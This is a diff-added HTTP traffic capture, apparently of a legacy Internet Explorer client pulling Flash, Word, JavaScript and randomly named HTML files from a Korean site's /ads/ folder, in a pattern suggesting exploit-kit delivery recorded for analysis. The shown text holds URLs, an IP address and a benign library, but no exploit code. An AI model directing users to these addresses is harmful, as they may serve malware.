+		<requestMethod></requestMethod>
+		<cookies></cookies>
+		<headers></headers>
+	</request>
+	<response>
+		<responseStatus></responseStatus>
+		<cookies></cookies>
+		<headers></headers>
+		<content>
+			<contentLength>9587</contentLength>
+			<mimeType>application/x-shockwave-flash</mimeType>
+		</content>
+	</response>
+	<cache>
+		<beforeRequest>
+			<URLInCache>true</URLInCache>
+			<lastModification>2017-01-18T14:00:55</lastModification>
+			<lastCacheUpdate>2017-01-19T03:00:04</lastCacheUpdate>
+			<lastAccess>2017-01-19T03:00:03.596</lastAccess>
+			<eTag>&quot;19c07ea-2573-5465ed868c3ff&quot;</eTag>
+			<hitCount>1</hitCount>
+		</beforeRequest>
+		<afterRequest>
+			<URLInCache>true</URLInCache>
+			<lastModification>2017-01-18T14:00:55</lastModification>
+			<lastCacheUpdate>2017-01-19T03:00:04</lastCacheUpdate>
+			<lastAccess>2017-01-19T03:00:03.626</lastAccess>
+			<eTag>&quot;19c07ea-2573-5465ed868c3ff&quot;</eTag>
+			<hitCount>4</hitCount>
+		</afterRequest>
+	</cache>
+	<timings>
+		<cache_read started="0.000">0.013</cache_read>
+	</timings>
+</entry>
+<entry method="GET" URL="http://www.joongohwamoolcha.com/ads/logo.swf">
+	<pageref idref="page_9" />
+	<started>00:55:17.034</started>
+	<startedDateTime>2017-01-19T12:00:10.637</startedDateTime>
+	<time>0.028</time>
+	<sent>305</sent>
+	<received>422</received>	<result>404</result>
+	<overview>
+		<action name="Display URL" status="Completed">Normal browser lookup of URL http://www.joongohwamoolcha.com/ads/logo.swf</action>
+		<action name="Started At" status="Completed">2017-Jan-19 12:00:10.637 (local time)</action>
+		<action name="HTTP Request" status="Completed">Unconditional request sent for http://www.joongohwamoolcha.com/ads/logo.swf</action>
+		<action name="HTTP Response" status="Completed">Headers and content returned</action>
+	</overview>
+	<request>
+		<requestMethod>GET /ads/logo.swf HTTP/1.1</requestMethod>
+		<cookies></cookies>
+		<headers>
+			<header name="Accept">image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/x-shockwave-flash, */*</header>
+			<header name="Accept-Encoding">gzip, deflate</header>
+			<header name="Accept-Language">ko</header>
+			<header name="Connection">Keep-Alive</header>
+			<header name="Host">www.joongohwamoolcha.com</header>
+			<header name="User-Agent">Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)</header>
+		</headers>
+	</request>
+	<response>
+		<responseStatus>HTTP/1.1 404 Not Found</responseStatus>
+		<cookies></cookies>
+		<headers>
+			<header name="Connection">Keep-Alive</header>
+			<header name="Content-Length">210</header>
+			<header name="Content-Type">text/html; charset=iso-8859-1</header>
+			<header name="Date">Thu, 19 Jan 2017 03:00:09 GMT</header>
+			<header name="Keep-Alive">timeout=15, max=91</header>
+			<header name="Server">Microsoft-IIS/5.0</header>
+		</headers>
+		<content>
+			<contentLength>210</contentLength>
+			<text><![CDATA[
+<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">.<html><head>.<title>404 Not Found</title>.</head><body>.<h1>Not Found</h1>.<p>The requested URL /ads/logo.swf was not found on this server.</p>.</body></html>.
+]]></text>
+			<mimeType>text/html; charset=iso-8859-1</mimeType>
+		</content>
+	</response>
+	<cache>
+		<beforeRequest>
+			<URLInCache>false</URLInCache>
+		</beforeRequest>
+		<afterRequest>
+			<URLInCache>false</URLInCache>
+		</afterRequest>
+	</cache>
+	<timings>
+		<blocked started="0.000">0.023</blocked>
+		<send started="0.023">0.000</send>
+		<wait started="0.024">0.003</wait>
+		<receive started="0.027">0.000</receive>
+		<ttfb started="0.023">0.004</ttfb>
+		<network started="0.023">0.004</network>
+	</timings>
+</entry>
+<entry method="GET" URL="http://www.joongohwamoolcha.com/ads/ww.html">
+	<pageref idref="page_10" />
+	<started>00:55:26.769</started>
+	<startedDateTime>2017-01-19T12:00:20.372</startedDateTime>
+	<time>0.029</time>
+	<sent>304</sent>
+	<received>5500</received>	<result>200</result>
+	<overview>
+		<action name="Display URL" status="Completed">Normal browser lookup of URL http://www.joongohwamoolcha.com/ads/ww.html</action>
+		<action name="Started At" status="Completed">2017-Jan-19 12:00:20.372 (local time)</action>
+		<action name="HTTP Request" status="Completed">Unconditional request sent for http://www.joongohwamoolcha.com/ads/ww.html</action>
+		<action name="HTTP Response" status="Completed">Headers and content returned</action>
+	</overview>
+	<request>
+		<requestMethod>GET /ads/ww.html HTTP/1.1</requestMethod>
+		<cookies></cookies>
+		<headers>
+			<header name="Accept">image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/x-shockwave-flash, */*</header>
+			<header name="Accept-Encoding">gzip, deflate</header>
+			<header name="Accept-Language">ko</header>
+			<header name="Connection">Keep-Alive</header>
+			<header name="Host">www.joongohwamoolcha.com</header>
+			<header name="User-Agent">Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)</header>
+		</headers>
+	</request>
+	<response>
+		<responseStatus>HTTP/1.1 200 OK</responseStatus>
+		<cookies></cookies>
+		<headers>
+			<header name="Connection">Keep-Alive</header>
+			<header name="Content-Length">5289</header>
+			<header name="Content-Type">text/html</header>
+			<header name="Date">Thu, 19 Jan 2017 03:00:19 GMT</header>
+			<header name="Keep-Alive">timeout=15, max=90</header>
+			<header name="Server">Microsoft-IIS/5.0</header>
+			<header name="X-Powered-By">PHP/4.4.9</header>
+		</headers>
+		<content>
+			<contentLength>5289</contentLength>
+			<mimeType>text/html</mimeType>
+		</content>
+	</response>
+	<cache>
+		<beforeRequest>
+			<URLInCache>true</URLInCache>
+			<lastCacheUpdate>2017-01-19T02:41:12</lastCacheUpdate>
+			<lastAccess>2017-01-19T02:41:11.890</lastAccess>
+			<eTag></eTag>
+			<hitCount>1</hitCount>
+		</beforeRequest>
+		<afterRequest>
+			<URLInCache>true</URLInCache>
+			<lastCacheUpdate>2017-01-19T03:00:22</lastCacheUpdate>
+			<lastAccess>2017-01-19T03:00:20.441</lastAccess>
+			<eTag></eTag>
+			<hitCount>3</hitCount>
+		</afterRequest>
+	</cache>
+	<timings>
+		<blocked started="0.000">0.022</blocked>
+		<send started="0.022">0.000</send>
+		<wait started="0.022">0.005</wait>
+		<receive started="0.028">0.000</receive>
+		<ttfb started="0.022">0.006</ttfb>
+		<network started="0.022">0.007</network>
+	</timings>
+</entry>
+<entry method="GET" URL="http://www.joongohwamoolcha.com/ads/ww.js">
+	<pageref idref="page_10" />
+	<started>00:55:26.804</started>
+	<startedDateTime>2017-01-19T12:00:20.407</startedDateTime>
+	<time>0.012</time>
+	<sent>365</sent>
+	<received>183</received>	<result>304</result>
+	<overview>
+		<action name="Display URL" status="Completed">Normal browser lookup of URL http://www.joongohwamoolcha.com/ads/ww.js</action>
+		<action name="Started At" status="Completed">2017-Jan-19 12:00:20.407 (local time)</action>
+		<action name="HTTP Request" status="Completed">Check if modified since &apos;Wed, 18 Jan 2017 14:02:18 GMT&apos;</action>
+		<action name="HTTP Response" status="Completed">Only headers returned as content has not changed</action>
+	</overview>
+	<request>
+		<requestMethod>GET /ads/ww.js HTTP/1.1</requestMethod>
+		<cookies></cookies>
+		<headers>
+			<header name="Accept">*/*</header>
+			<header name="Accept-Encoding">gzip, deflate</header>
+			<header name="Accept-Language">ko</header>
+			<header name="Connection">Keep-Alive</header>
+			<header name="Host">www.joongohwamoolcha.com</header>
+			<header name="If-Modified-Since">Wed, 18 Jan 2017 14:02:18 GMT</header>
+			<header name="If-None-Match">&quot;19c0dd4-e0-5465edd597d87&quot;</header>
+			<header name="Referer">http://www.joongohwamoolcha.com/ads/ww.html</header>
+			<header name="User-Agent">Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)</header>
+		</headers>
+	</request>
+	<response>
+		<responseStatus>HTTP/1.1 304 Not Modified</responseStatus>
+		<cookies></cookies>
+		<headers>
+			<header name="Connection">Keep-Alive</header>
+			<header name="Date">Thu, 19 Jan 2017 03:00:19 GMT</header>
+			<header name="ETag">&quot;19c0dd4-e0-5465edd597d87&quot;</header>
+			<header name="Keep-Alive">timeout=15, max=89</header>
+			<header name="Server">Microsoft-IIS/5.0</header>
+		</headers>
+		<content>
+			<contentLength>224</contentLength>
+			<mimeType>application/javascript</mimeType>
+		</content>
+	</response>
+	<cache>
+		<beforeRequest>
+			<URLInCache>true</URLInCache>
+			<lastModification>2017-01-18T14:02:18</lastModification>
+			<lastCacheUpdate>2017-01-19T02:41:12</lastCacheUpdate>
+			<lastAccess>2017-01-19T02:41:11.900</lastAccess>
+			<eTag>&quot;19c0dd4-e0-5465edd597d87&quot;</eTag>
+			<hitCount>1</hitCount>
+		</beforeRequest>
+		<afterRequest>
+			<URLInCache>true</URLInCache>
+			<lastModification>2017-01-18T14:02:18</lastModification>
+			<lastCacheUpdate>2017-01-19T03:00:22</lastCacheUpdate>
+			<lastAccess>2017-01-19T03:00:20.461</lastAccess>
+			<eTag>&quot;19c0dd4-e0-5465edd597d87&quot;</eTag>
+			<hitCount>4</hitCount>
+		</afterRequest>
+	</cache>
+	<timings>
+		<blocked started="0.000">0.000</blocked>
+		<send started="0.000">0.000</send>
+		<wait started="0.000">0.011</wait>
+		<receive started="0.012">0.000</receive>
+		<cache_read started="0.012">0.000</cache_read>
+		<ttfb started="0.000">0.011</ttfb>
+		<network started="0.000">0.011</network>
+	</timings>
+</entry>
+<entry method="GET" URL="http://www.joongohwamoolcha.com/ads/ww.swf">
+	<pageref idref="page_10" />
+	<started>00:55:27.241</started>
+	<startedDateTime>2017-01-19T12:00:20.844</startedDateTime>
+	<time>0.000</time>
+	<sent>0</sent>
+	<received>0</received>	<result>(Cache)</result>
+	<overview>
+		<action name="Display URL" status="Completed">Normal browser lookup of URL http://www.joongohwamoolcha.com/ads/ww.swf</action>
+		<action name="Started At" status="Completed">2017-Jan-19 12:00:20.844 (local time)</action>
+		<action name="Read Cache" status="Completed">Content read from browser cache</action>
+	</overview>
+	<request>
+		<requestMethod></requestMethod>
+		<cookies></cookies>
+		<headers></headers>
+	</request>
+	<response>
+		<responseStatus></responseStatus>
+		<cookies></cookies>
+		<headers></headers>
+		<content>
+			<contentLength>901</contentLength>
+			<mimeType>application/x-shockwave-flash</mimeType>
+		</content>
+	</response>
+	<cache>
+		<beforeRequest>
+			<URLInCache>true</URLInCache>
+			<lastModification>2017-01-18T14:02:23</lastModification>
+			<lastCacheUpdate>2017-01-19T03:00:22</lastCacheUpdate>
+			<lastAccess>2017-01-19T03:00:20.871</lastAccess>
+			<eTag>&quot;19c0dd6-385-5465eddb09a4f&quot;</eTag>
+			<hitCount>2</hitCount>
+		</beforeRequest>
+		<afterRequest>
+			<URLInCache>true</URLInCache>
+			<lastModification>2017-01-18T14:02:23</lastModification>
+			<lastCacheUpdate>2017-01-19T03:00:22</lastCacheUpdate>
+			<lastAccess>2017-01-19T03:00:20.881</lastAccess>
+			<eTag>&quot;19c0dd6-385-5465eddb09a4f&quot;</eTag>
+			<hitCount>5</hitCount>
+		</afterRequest>
+	</cache>
+	<timings>
+		<cache_read started="0.000">0.000</cache_read>
+	</timings>
+</entry>
+<entry method="GET" URL="http://www.joongohwamoolcha.com/ads/ww.doc">
+	<pageref idref="page_10" />
+	<started>00:55:27.307</started>
+	<startedDateTime>2017-01-19T12:00:20.910</startedDateTime>
+	<time>0.015</time>
+	<sent>398</sent>
+	<received>184</received>	<result>304</result>
+	<overview>
+		<action name="Display URL" status="Completed">Normal browser lookup of URL http://www.joongohwamoolcha.com/ads/ww.doc</action>
+		<action name="Started At" status="Completed">2017-Jan-19 12:00:20.910 (local time)</action>
+		<action name="HTTP Request" status="Completed">Check if modified since &apos;Wed, 18 Jan 2017 14:02:07 GMT&apos;</action>
+		<action name="HTTP Response" status="Completed">Only headers returned as content has not changed</action>
+		<action name="Read Cache" status="Completed">Content read from browser cache</action>
+	</overview>
+	<request>
+		<requestMethod>GET /ads/ww.doc HTTP/1.1</requestMethod>
+		<cookies></cookies>
+		<headers>
+			<header name="Accept">*/*</header>
+			<header name="Accept-Encoding">gzip, deflate</header>
+			<header name="Accept-Language">ko-KR</header>
+			<header name="Connection">Keep-Alive</header>
+			<header name="Host">www.joongohwamoolcha.com</header>
+			<header name="If-Modified-Since">Wed, 18 Jan 2017 14:02:07 GMT</header>
+			<header name="If-None-Match">&quot;19c0dd0-b89-5465edcb0dd8f&quot;</header>
+			<header name="Referer">http://www.joongohwamoolcha.com/ads/ww.swf</header>
+			<header name="User-Agent">Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)</header>
+			<header name="x-flash-version">15,0,0,152</header>
+		</headers>
+	</request>
+	<response>
+		<responseStatus>HTTP/1.1 304 Not Modified</responseStatus>
+		<cookies></cookies>
+		<headers>
+			<header name="Connection">Keep-Alive</header>
+			<header name="Date">Thu, 19 Jan 2017 03:00:19 GMT</header>
+			<header name="ETag">&quot;19c0dd0-b89-5465edcb0dd8f&quot;</header>
+			<header name="Keep-Alive">timeout=15, max=87</header>
+			<header name="Server">Microsoft-IIS/5.0</header>
+		</headers>
+		<content>
+			<contentLength>2953</contentLength>
+			<mimeType>application/msword</mimeType>
+		</content>
+	</response>
+	<cache>
+		<beforeRequest>
+			<URLInCache>true</URLInCache>
+			<lastModification>2017-01-18T14:02:07</lastModification>
+			<lastCacheUpdate>2017-01-19T02:41:14</lastCacheUpdate>
+			<lastAccess>2017-01-19T02:41:12.270</lastAccess>
+			<eTag>&quot;19c0dd0-b89-5465edcb0dd8f&quot;</eTag>
+			<hitCount>1</hitCount>
+		</beforeRequest>
+		<afterRequest>
+			<URLInCache>true</URLInCache>
+			<lastModification>2017-01-18T14:02:07</lastModification>
+			<lastCacheUpdate>2017-01-19T03:00:22</lastCacheUpdate>
+			<lastAccess>2017-01-19T03:00:20.951</lastAccess>
+			<eTag>&quot;19c0dd0-b89-5465edcb0dd8f&quot;</eTag>
+			<hitCount>2</hitCount>
+		</afterRequest>
+	</cache>
+	<timings>
+		<blocked started="0.000">0.011</blocked>
+		<send started="0.011">0.000</send>
+		<wait started="0.011">0.003</wait>
+		<receive started="0.014">0.000</receive>
+		<cache_read started="0.014">0.000</cache_read>
+		<ttfb started="0.011">0.003</ttfb>
+		<network started="0.011">0.003</network>
+	</timings>
+</entry>
+<entry method="GET" URL="http://www.joongohwamoolcha.com/ads/VoEuTs.html">
+	<pageref idref="page_11" />
+	<started>00:55:32.216</started>
+	<startedDateTime>2017-01-19T12:00:25.819</startedDateTime>
+	<time>0.033</time>
+	<sent>308</sent>
+	<received>13246</received>	<result>200</result>
+	<overview>
+		<action name="Display URL" status="Completed">Normal browser lookup of URL http://www.joongohwamoolcha.com/ads/VoEuTs.html</action>
+		<action name="Started At" status="Completed">2017-Jan-19 12:00:25.819 (local time)</action>
+		<action name="HTTP Request" status="Completed">Unconditional request sent for http://www.joongohwamoolcha.com/ads/VoEuTs.html</action>
+		<action name="HTTP Response" status="Completed">Headers and content returned</action>
+	</overview>
+	<request>
+		<requestMethod>GET /ads/VoEuTs.html HTTP/1.1</requestMethod>
+		<cookies></cookies>
+		<headers>
+			<header name="Accept">image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/x-shockwave-flash, */*</header>
+			<header name="Accept-Encoding">gzip, deflate</header>
+			<header name="Accept-Language">ko</header>
+			<header name="Connection">Keep-Alive</header>
+			<header name="Host">www.joongohwamoolcha.com</header>
+			<header name="User-Agent">Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)</header>
+		</headers>
+	</request>
+	<response>
+		<responseStatus>HTTP/1.1 200 OK</responseStatus>
+		<cookies></cookies>
+		<headers>
+			<header name="Connection">Keep-Alive</header>
+			<header name="Content-Type">text/html</header>
+			<header name="Date">Thu, 19 Jan 2017 03:00:24 GMT</header>
+			<header name="Keep-Alive">timeout=15, max=86</header>
+			<header name="Server">Microsoft-IIS/5.0</header>
+			<header name="Transfer-Encoding">chunked</header>
+			<header name="X-Powered-By">PHP/4.4.9</header>
+		</headers>
+		<content>
+			<contentLength>13008</contentLength>
+			<mimeType>text/html</mimeType>
+		</content>
+	</response>
+	<cache>
+		<beforeRequest>
+			<URLInCache>false</URLInCache>
+		</beforeRequest>
+		<afterRequest>
+			<URLInCache>true</URLInCache>
+			<lastCacheUpdate>2017-01-19T03:00:26</lastCacheUpdate>
+			<lastAccess>2017-01-19T03:00:25.908</lastAccess>
+			<eTag></eTag>
+			<hitCount>1</hitCount>
+		</afterRequest>
+	</cache>
+	<timings>
+		<blocked started="0.000">0.025</blocked>
+		<send started="0.025">0.000</send>
+		<wait started="0.025">0.006</wait>
+		<receive started="0.032">0.000</receive>
+		<ttfb started="0.025">0.007</ttfb>
+		<network started="0.025">0.008</network>
+	</timings>
+</entry>
+<entry method="GET" URL="http://www.joongohwamoolcha.com/ads/ReJhBz.html">
+	<pageref idref="page_12" />
+	<started>00:55:37.633</started>
+	<startedDateTime>2017-01-19T12:00:31.236</startedDateTime>
+	<time>0.033</time>
+	<sent>308</sent>
+	<received>15776</received>	<result>200</result>
+	<overview>
+		<action name="Display URL" status="Completed">Normal browser lookup of URL http://www.joongohwamoolcha.com/ads/ReJhBz.html</action>
+		<action name="Started At" status="Completed">2017-Jan-19 12:00:31.236 (local time)</action>
+		<action name="HTTP Request" status="Completed">Unconditional request sent for http://www.joongohwamoolcha.com/ads/ReJhBz.html</action>
+		<action name="HTTP Response" status="Completed">Headers and content returned</action>
+	</overview>
+	<request>
+		<requestMethod>GET /ads/ReJhBz.html HTTP/1.1</requestMethod>
+		<cookies></cookies>
+		<headers>
+			<header name="Accept">image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/x-shockwave-flash, */*</header>
+			<header name="Accept-Encoding">gzip, deflate</header>
+			<header name="Accept-Language">ko</header>
+			<header name="Connection">Keep-Alive</header>
+			<header name="Host">www.joongohwamoolcha.com</header>
+			<header name="User-Agent">Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)</header>
+		</headers>
+	</request>
+	<response>
+		<responseStatus>HTTP/1.1 200 OK</responseStatus>
+		<cookies></cookies>
+		<headers>
+			<header name="Connection">Keep-Alive</header>
+			<header name="Content-Type">text/html</header>
+			<header name="Date">Thu, 19 Jan 2017 03:00:30 GMT</header>
+			<header name="Keep-Alive">timeout=15, max=85</header>
+			<header name="Server">Microsoft-IIS/5.0</header>
+			<header name="Transfer-Encoding">chunked</header>
+			<header name="X-Powered-By">PHP/4.4.9</header>
+		</headers>
+		<content>
+			<contentLength>15538</contentLength>
+			<mimeType>text/html</mimeType>
+		</content>
+	</response>
+	<cache>
+		<beforeRequest>
+			<URLInCache>true</URLInCache>
+			<lastCacheUpdate>2017-01-19T02:04:54</lastCacheUpdate>
+			<lastAccess>2017-01-19T02:04:53.783</lastAccess>
+			<eTag></eTag>
+			<hitCount>3</hitCount>
+		</beforeRequest>
+		<afterRequest>
+			<URLInCache>true</URLInCache>
+			<lastCacheUpdate>2017-01-19T03:00:32</lastCacheUpdate>
+			<lastAccess>2017-01-19T03:00:31.306</lastAccess>
+			<eTag></eTag>
+			<hitCount>5</hitCount>
+		</afterRequest>
+	</cache>
+	<timings>
+		<blocked started="0.000">0.001</blocked>
+		<send started="0.001">0.020</send>
+		<wait started="0.021">0.007</wait>
+		<receive started="0.029">0.003</receive>
+		<ttfb started="0.001">0.028</ttfb>
+		<network started="0.001">0.032</network>
+	</timings>
+</entry>
+<entry method="GET" URL="http://www.joongohwamoolcha.com/ads/FlCsPu.html">
+	<pageref idref="page_13" />
+	<started>00:55:42.424</started>
+	<startedDateTime>2017-01-19T12:00:36.027</startedDateTime>
+	<time>0.046</time>
+	<sent>308</sent>
+	<received>14877</received>	<result>200</result>
+	<overview>
+		<action name="Display URL" status="Completed">Normal browser lookup of URL http://www.joongohwamoolcha.com/ads/FlCsPu.html</action>
+		<action name="Started At" status="Completed">2017-Jan-19 12:00:36.027 (local time)</action>
+		<action name="HTTP Request" status="Completed">Unconditional request sent for http://www.joongohwamoolcha.com/ads/FlCsPu.html</action>
+		<action name="HTTP Response" status="Completed">Headers and content returned</action>
+	</overview>
+	<request>
+		<requestMethod>GET /ads/FlCsPu.html HTTP/1.1</requestMethod>
+		<cookies></cookies>
+		<headers>
+			<header name="Accept">image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/x-shockwave-flash, */*</header>
+			<header name="Accept-Encoding">gzip, deflate</header>
+			<header name="Accept-Language">ko</header>
+			<header name="Connection">Keep-Alive</header>
+			<header name="Host">www.joongohwamoolcha.com</header>
+			<header name="User-Agent">Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)</header>
+		</headers>
+	</request>
+	<response>
+		<responseStatus>HTTP/1.1 200 OK</responseStatus>
+		<cookies></cookies>
+		<headers>
+			<header name="Connection">Keep-Alive</header>
+			<header name="Content-Type">text/html</header>
+			<header name="Date">Thu, 19 Jan 2017 03:00:35 GMT</header>
+			<header name="Keep-Alive">timeout=15, max=84</header>
+			<header name="Server">Microsoft-IIS/5.0</header>
+			<header name="Transfer-Encoding">chunked</header>
+			<header name="X-Powered-By">PHP/4.4.9</header>
+		</headers>
+		<content>
+			<contentLength>14639</contentLength>
+			<mimeType>text/html</mimeType>
+		</content>
+	</response>
+	<cache>
+		<beforeRequest>
+			<URLInCache>false</URLInCache>
+		</beforeRequest>
+		<afterRequest>
+			<URLInCache>true</URLInCache>
+			<lastCacheUpdate>2017-01-19T03:00:38</lastCacheUpdate>
+			<lastAccess>2017-01-19T03:00:36.133</lastAccess>
+			<eTag></eTag>
+			<hitCount>1</hitCount>
+		</afterRequest>
+	</cache>
+	<timings>
+		<blocked started="0.000">0.022</blocked>
+		<send started="0.022">0.000</send>
+		<wait started="0.023">0.005</wait>
+		<receive started="0.029">0.016</receive>
+		<ttfb started="0.022">0.006</ttfb>
+		<network started="0.022">0.023</network>
+	</timings>
+</entry>
+<entry method="GET" URL="http://www.joongohwamoolcha.com/ads/Long.js">
+	<pageref idref="page_13" />
+	<started>00:55:42.456</started>
+	<startedDateTime>2017-01-19T12:00:36.059</startedDateTime>
+	<time>0.048</time>
+	<sent>278</sent>
+	<received>8048</received>	<result>200</result>
+	<overview>
+		<action name="Display URL" status="Completed">Normal browser lookup of URL http://www.joongohwamoolcha.com/ads/Long.js</action>
+		<action name="Started At" status="Completed">2017-Jan-19 12:00:36.059 (local time)</action>
+		<action name="Connect" status="Completed">Connect to IP address &apos;211.115.80.22&apos;</action>
+		<action name="HTTP Request" status="Completed">Unconditional request sent for http://www.joongohwamoolcha.com/ads/Long.js</action>
+		<action name="HTTP Response" status="Completed">Headers and content returned</action>
+	</overview>
+	<request>
+		<requestMethod>GET /ads/Long.js HTTP/1.1</requestMethod>
+		<cookies></cookies>
+		<headers>
+			<header name="Accept">*/*</header>
+			<header name="Accept-Encoding">gzip, deflate</header>
+			<header name="Accept-Language">ko</header>
+			<header name="Connection">Keep-Alive</header>
+			<header name="Host">www.joongohwamoolcha.com</header>
+			<header name="Referer">http://www.joongohwamoolcha.com/ads/FlCsPu.html</header>
+			<header name="User-Agent">Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)</header>
+		</headers>
+	</request>
+	<response>
+		<responseStatus>HTTP/1.1 200 OK</responseStatus>
+		<cookies></cookies>
+		<headers>
+			<header name="Accept-Ranges">bytes</header>
+			<header name="Connection">Keep-Alive</header>
+			<header name="Content-Length">7744</header>
+			<header name="Content-Type">application/javascript</header>
+			<header name="Date">Thu, 19 Jan 2017 03:00:35 GMT</header>
+			<header name="ETag">&quot;19c0d7e-1e40-5465edb367e47&quot;</header>
+			<header name="Keep-Alive">timeout=15, max=100</header>
+			<header name="Last-Modified">Wed, 18 Jan 2017 14:01:42 GMT</header>
+			<header name="Server">Microsoft-IIS/5.0</header>
+		</headers>
+		<content>
+			<contentLength>7744</contentLength>
+			<text><![CDATA[
+/*. long.js (c) 2013 Daniel Wirtz <dcode@dcode.io>. Released under the Apache License, Version 2.0. see: https://github.com/dcodeIO/long.js for details.*/.(function(d,g){"function"===typeof define&&define.amd?define([],g):"function"===typeof require&&"object"===typeof module&&module&&module.exports?module.exports=g():(d.dcodeIO=d.dcodeIO||{}).Long=g()})(this,function(){function d(a,b,c){this.low=a|0;this.high=b|0;this.unsigned=!!c}function g(a){return!0===(a&&a.__isLong__)}function m(a,b){var c,t;if(b){a>>>=0;if(t=0<=a&&256>a)if(c=z[a])return c;c=e(a,0>(a|0)?-1:0,!0);t&&(z[a]=c)}else{a|=0;if(t=-128<=a&&128>a)if(c=A[a])return c;c=e(a,0>a?-1:0,!1);t&&.(A[a]=c)}return c}function n(a,b){if(isNaN(a)||!isFinite(a))return b?p:k;if(b){if(0>a)return p;if(a>=B)return C}else{if(a<=-D)return l;if(a+1>=D)return E}return 0>a?n(-a,b).neg():e(a%4294967296|0,a/4294967296|0,b)}function e(a,b,c){return new d(a,b,c)}function x(a,b,c){if(0===a.length)throw Error("empty string");if("NaN"===a||"Infinity"===a||"+Infinity"===a||"-Infinity"===a)return k;"number"===typeof b?(c=b,b=!1):b=!!b;c=c||10;if(2>c||36<c)throw RangeError("radix");var t;if(0<(t=a.indexOf("-")))throw Error("interior hyphen");.if(0===t)return x(a.substring(1),b,c).neg();t=n(v(c,8));for(var e=k,f=0;f<a.length;f+=8){var d=Math.min(8,a.length-f),g=parseInt(a.substring(f,f+d),c);8>d?(d=n(v(c,d)),e=e.mul(d).add(n(g))):(e=e.mul(t),e=e.add(n(g)))}e.unsigned=b;return e}function q(a){return a instanceof d?a:"number"===typeof a?n(a):"string"===typeof a?x(a):e(a.low,a.high,a.unsigned)}Object.defineProperty(d.prototype,"__isLong__",{value:!0,enumerable:!1,configurable:!1});d.isLong=g;var A={},z={};d.fromInt=m;d.fromNumber=n;d.fromBits=.e;var v=Math.pow;d.fromString=x;d.fromValue=q;var B=4294967296*4294967296,D=B/2,F=m(16777216),k=m(0);d.ZERO=k;var p=m(0,!0);d.UZERO=p;var r=m(1);d.ONE=r;var G=m(1,!0);d.UONE=G;var y=m(-1);d.NEG_ONE=y;var E=e(-1,2147483647,!1);d.MAX_VALUE=E;var C=e(-1,-1,!0);d.MAX_UNSIGNED_VALUE=C;var l=e(0,-2147483648,!1);d.MIN_VALUE=l;var b=d.prototype;b.toInt=function(){return this.unsigned?this.low>>>0:this.low};b.toNumber=function(){return this.unsigned?4294967296*(this.high>>>0)+(this.low>>>0):4294967296*this.high+.(this.low>>>0)};b.toString=function(a){a=a||10;if(2>a||36<a)throw RangeError("radix");if(this.isZero())return"0";if(this.isNegative()){if(this.eq(l)){var b=n(a),c=this.div(b),b=c.mul(b).sub(this);return c.toString(a)+b.toInt().toString(a)}return"-"+this.neg().toString(a)}for(var c=n(v(a,6),this.unsigned),b=this,e="";;){var d=b.div(c),f=(b.sub(d.mul(c)).toInt()>>>0).toString(a),b=d;if(b.isZero())return f+e;for(;6>f.length;)f="0"+f;e=""+f+e}};b.getHighBits=function(){return this.high};b.getHighBitsUnsigned=.function(){return this.high>>>0};b.getLowBits=function(){return this.low};b.getLowBitsUnsigned=function(){return this.low>>>0};b.getNumBitsAbs=function(){if(this.isNegative())return this.eq(l)?64:this.neg().getNumBitsAbs();for(var a=0!=this.high?this.high:this.low,b=31;0<b&&0==(a&1<<b);b--);return 0!=this.high?b+33:b+1};b.isZero=function(){return 0===this.high&&0===this.low};b.isNegative=function(){return!this.unsigned&&0>this.high};b.isPositive=function(){return this.unsigned||0<=this.high};b.isOdd=.function(){return 1===(this.low&1)};b.isEven=function(){return 0===(this.low&1)};b.equals=function(a){g(a)||(a=q(a));return this.unsigned!==a.unsigned&&1===this.high>>>31&&1===a.high>>>31?!1:this.high===a.high&&this.low===a.low};b.eq=b.equals;b.notEquals=function(a){return!this.eq(a)};b.neq=b.notEquals;b.lessThan=function(a){return 0>this.comp(a)};b.lt=b.lessThan;b.lessThanOrEqual=function(a){return 0>=this.comp(a)};b.lte=b.lessThanOrEqual;b.greaterThan=function(a){return 0<this.comp(a)};b.gt=b.greaterThan;.b.greaterThanOrEqual=function(a){return 0<=this.comp(a)};b.gte=b.greaterThanOrEqual;b.compare=function(a){g(a)||(a=q(a));if(this.eq(a))return 0;var b=this.isNegative(),c=a.isNegative();return b&&!c?-1:!b&&c?1:this.unsigned?a.high>>>0>this.high>>>0||a.high===this.high&&a.low>>>0>this.low>>>0?-1:1:this.sub(a).isNegative()?-1:1};b.comp=b.compare;b.negate=function(){return!this.unsigned&&this.eq(l)?l:this.not().add(r)};b.neg=b.negate;b.add=function(a){g(a)||(a=q(a));var b=this.high>>>16,c=this.high&65535,.d=this.low>>>16,l=a.high>>>16,f=a.high&65535,n=a.low>>>16,k;k=0+((this.low&65535)+(a.low&65535));a=0+(k>>>16);a+=d+n;d=0+(a>>>16);d+=c+f;c=0+(d>>>16);c=c+(b+l)&65535;return e((a&65535)<<16|k&65535,c<<16|d&65535,this.unsigned)};b.subtract=function(a){g(a)||(a=q(a));return this.add(a.neg())};b.sub=b.subtract;b.multiply=function(a){if(this.isZero())return k;g(a)||(a=q(a));if(a.isZero())return k;if(this.eq(l))return a.isOdd()?l:k;if(a.eq(l))return this.isOdd()?l:k;if(this.isNegative())return a.isNegative()?.this.neg().mul(a.neg()):this.neg().mul(a).neg();if(a.isNegative())return this.mul(a.neg()).neg();if(this.lt(F)&&a.lt(F))return n(this.toNumber()*a.toNumber(),this.unsigned);var b=this.high>>>16,c=this.high&65535,d=this.low>>>16,w=this.low&65535,f=a.high>>>16,m=a.high&65535,p=a.low>>>16;a=a.low&65535;var 